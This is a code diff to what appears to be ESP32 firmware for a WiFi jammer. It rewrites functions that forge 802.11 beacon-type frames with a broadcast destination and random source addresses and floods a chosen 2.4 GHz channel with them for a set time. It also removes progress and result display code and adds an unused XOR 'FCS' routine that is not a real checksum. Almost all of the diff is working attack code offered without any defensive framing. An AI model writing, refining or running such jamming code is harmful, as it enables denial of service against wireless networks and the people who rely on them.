@@ -9,49 +9,73 @@ namespace {
 volatile bool g_jamActive = false;
 uint32_t g_jamCount = 0;
 
-void sendJamPacket() {
-    uint8_t jamData[64];
-    for (int i = 0; i < 64; i++) {
-        jamData[i] = (esp_random() % 256);
+typedef struct {
+    uint8_t frameCtrl[2];
+    uint8_t duration[2];
+    uint8_t addr1[6];
+    uint8_t addr2[6];
+    uint8_t addr3[6];
+    uint8_t seqCtrl[2];
+} ieee80211_frame_t;
+
+uint8_t calculateFCS(const uint8_t* data, uint32_t len) {
+    uint8_t crc = 0;
+    for (uint32_t i = 0; i < len; i++) {
+        crc ^= data[i];
     }
+    return crc;
 }
 
 void sendBeaconJamFrame(const String& method) {
     uint8_t jamFrame[128];
-    for (int i = 0; i < 128; i++) {
-        jamFrame[i] = esp_random() & 0xFF;
-    }
+    ieee80211_frame_t* frame = (ieee80211_frame_t*)jamFrame;
 
-    // Send jam frame (simplified - just transmit random data pattern)
     if (method == "CHANNEL") {
-        jamFrame[0] = 0x80;  // Frame control
-        jamFrame[1] = 0x00;
+        frame->frameCtrl[0] = 0x80;
+        frame->frameCtrl[1] = 0x00;
+        frame->duration[0] = 0x00;
+        frame->duration[1] = 0x00;
 
-        // Fill with random data
-        for (int i = 2; i < 60; i++) {
-            jamFrame[i] = esp_random() & 0xFF;
+        memset(frame->addr1, 0xFF, 6);
+        for (int i = 0; i < 6; i++) {
+            frame->addr2[i] = random(0, 256);
+            frame->addr3[i] = random(0, 256);
         }
 
-        esp_wifi_80211_tx(WIFI_IF_STA, jamFrame, 60, false);
+        frame->seqCtrl[0] = random(0, 256);
+        frame->seqCtrl[1] = random(0, 256);
+
+        uint32_t len = sizeof(ieee80211_frame_t);
+        esp_wifi_80211_tx(WIFI_IF_STA, jamFrame, len, false);
     }
     else if (method == "BEACON") {
-        jamFrame[0] = 0x80;  // Frame control
-        jamFrame[1] = 0x00;
-
-        // Fill with random data
-        for (int i = 2; i < 128; i++) {
-            jamFrame[i] = esp_random() & 0xFF;
+        frame->frameCtrl[0] = 0x80;
+        frame->frameCtrl[1] = 0x00;
+        memset(frame->addr1, 0xFF, 6);
+        for (int i = 0; i < 6; i++) {
+            frame->addr2[i] = random(0, 256);
+            frame->addr3[i] = random(0, 256);
         }
-        esp_wifi_80211_tx(WIFI_IF_STA, jamFrame, 128, false);
+
+        uint8_t payload[50];
+        for (int i = 0; i < 50; i++) {
+            payload[i] = random(0, 256);
+        }
+
+        uint32_t frameLen = sizeof(ieee80211_frame_t);
+        memcpy(jamFrame + frameLen, payload, 50);
+        esp_wifi_80211_tx(WIFI_IF_STA, jamFrame, frameLen + 50, false);
     }
     else {
         for (int attempt = 0; attempt < 3; attempt++) {
-            jamFrame[0] = 0x80 + attempt;
-            jamFrame[1] = 0x00;
-            for (int i = 2; i < 128; i++) {
-                jamFrame[i] = esp_random() & 0xFF;
+            frame->frameCtrl[0] = 0x80 + attempt;
+            frame->frameCtrl[1] = 0x00;
+            memset(frame->addr1, 0xFF, 6);
+            for (int i = 0; i < 6; i++) {
+                frame->addr2[i] = random(0, 256);
+                frame->addr3[i] = random(0, 256);
             }
-            esp_wifi_80211_tx(WIFI_IF_STA, jamFrame, 128, false);
+            esp_wifi_80211_tx(WIFI_IF_STA, jamFrame, sizeof(ieee80211_frame_t), false);
             delayMicroseconds(50);
         }
     }
@@ -94,12 +118,6 @@ JamResult jamWiFiNetwork(uint8_t channel, uint32_t durationMs, const String &met
             Serial.printf("  [%u] jamming frames sent in %lums\n",
                          g_jamCount, millis() - startTime);
         }
-
-        if (millis() - lastUpdate > 500) {
-            int percent = (millis() - startTime) * 100 / durationMs;
-            ResultsDisplay::updateProgress(percent, "Jamming: " + String(g_jamCount) + " frames");
-            lastUpdate = millis();
-        }
     }
 
     g_jamActive = false;
@@ -107,26 +125,9 @@ JamResult jamWiFiNetwork(uint8_t channel, uint32_t durationMs, const String &met
 
     result.success = true;
     result.jamPacketsCount = g_jamCount;
-    uint32_t elapsed = millis() - startTime;
-    float pktSec = (result.jamPacketsCount * 1000.0f) / elapsed;
-
     Serial.printf("✓ WiFi jamming complete: %u frames in %lums (%.1f pkt/sec)\n",
-                 result.jamPacketsCount, elapsed, pktSec);
-
-    ResultsDisplay::showResult("WiFi Jammer", {
-        "WiFi Jamming Attack",
-        "Jamming Complete",
-        100,
-        {
-            "Channel: " + String(channel) + " (2.4GHz)",
-            "Method: " + method,
-            "Frames: " + String(result.jamPacketsCount),
-            "Duration: " + String(elapsed) + "ms",
-            "Rate: " + String((int)pktSec) + " pkt/sec"
-        },
-        ResultsDisplay::ResultType::SUCCESS
-    });
-
+                 result.jamPacketsCount, millis() - startTime,
+                 (result.jamPacketsCount * 1000.0f) / (millis() - startTime));
     return result;
 }
 
